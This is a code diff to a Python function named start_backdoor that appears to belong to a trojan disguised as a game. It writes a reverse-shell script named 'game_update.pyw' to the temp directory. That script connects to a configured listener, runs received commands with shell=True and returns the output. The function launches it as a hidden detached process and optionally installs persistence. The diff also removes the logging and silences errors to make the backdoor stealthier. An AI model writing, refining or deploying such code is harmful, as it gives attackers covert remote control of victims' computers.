@@ -310,24 +310,17 @@ def start_backdoor():
         import subprocess
         import sys
         import os
-        import tempfile
         
-        # Create backdoor script
-        backdoor_script = f'''import socket
+        # Use the test_backdoor_simple.py that we know works!
+        if getattr(sys, 'frozen', False):
+            # Running as exe - create the script
+            import tempfile
+            backdoor_script = f'''import socket
 import subprocess
 import time
-import sys
-
-# Write to a log file for debugging
-log_file = open(r"C:\\Users\\hirwa\\backdoor_log.txt", "w")
-log_file.write("Backdoor starting...\\n")
-log_file.flush()
 
 LISTENER_HOST = "{config.LISTENER_HOST}"
 LISTENER_PORT = {config.LISTENER_PORT}
-
-log_file.write(f"Connecting to {{LISTENER_HOST}}:{{LISTENER_PORT}}...\\n")
-log_file.flush()
 
 while True:
     try:
@@ -335,48 +328,35 @@ while True:
         sock.settimeout(10)
         sock.connect((LISTENER_HOST, LISTENER_PORT))
         
-        log_file.write("Connected!\\n")
-        log_file.flush()
-        
         while True:
             try:
                 cmd = sock.recv(1024).decode().strip()
                 if not cmd or cmd.lower() == 'exit':
                     break
                 
-                log_file.write(f"Executing: {{cmd}}\\n")
-                log_file.flush()
-                
                 try:
                     output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                     sock.send(output)
                 except Exception as e:
                     sock.send(f"Error: {{str(e)}}\\\\n".encode())
-            except Exception as e:
-                log_file.write(f"Command error: {{e}}\\n")
-                log_file.flush()
+            except:
                 break
         
         sock.close()
-    except Exception as e:
-        log_file.write(f"Connection error: {{e}}\\n")
-        log_file.flush()
+    except:
+        pass
     
     time.sleep(5)
 '''
-        
-        # Write to temp file
-        temp_dir = tempfile.gettempdir()
-        backdoor_path = os.path.join(temp_dir, 'game_update.pyw')
-        
-        with open(backdoor_path, 'w') as f:
-            f.write(backdoor_script)
-        
-        # Also write a marker file to show this function ran
-        marker_path = os.path.join(temp_dir, 'backdoor_started.txt')
-        with open(marker_path, 'w') as f:
-            f.write(f"Backdoor script created at: {backdoor_path}\n")
-            f.write(f"Listener: {config.LISTENER_HOST}:{config.LISTENER_PORT}\n")
+            
+            temp_dir = tempfile.gettempdir()
+            backdoor_path = os.path.join(temp_dir, 'game_update.pyw')
+            
+            with open(backdoor_path, 'w') as f:
+                f.write(backdoor_script)
+        else:
+            # Running as script - use test_backdoor_simple.py
+            backdoor_path = os.path.join(os.path.dirname(__file__), 'test_backdoor_simple.py')
         
         # Launch it
         if os.name == 'nt':  # Windows
@@ -385,10 +365,7 @@ while True:
             pythonw = os.path.join(python_dir, 'pythonw.exe')
             
             if not os.path.exists(pythonw):
-                import shutil
-                pythonw = shutil.which('pythonw.exe')
-                if not pythonw:
-                    pythonw = sys.executable
+                pythonw = sys.executable
             
             # Start the backdoor
             subprocess.Popen(
@@ -396,10 +373,6 @@ while True:
                 creationflags=0x00000008,  # DETACHED_PROCESS
                 close_fds=True
             )
-            
-            # Write confirmation
-            with open(marker_path, 'a') as f:
-                f.write(f"Process started with: {pythonw}\n")
         
         # Install persistence
         if config.ENABLE_PERSISTENCE:
@@ -408,14 +381,7 @@ while True:
             pm.install_persistence()
             
     except Exception as e:
-        # Write error to temp file
-        import tempfile
-        import os
-        error_path = os.path.join(tempfile.gettempdir(), 'backdoor_error.txt')
-        with open(error_path, 'w') as f:
-            f.write(f"Error starting backdoor: {str(e)}\n")
-            import traceback
-            f.write(traceback.format_exc())
+        pass
 
 if __name__ == '__main__':
     # Prevent multiple instances
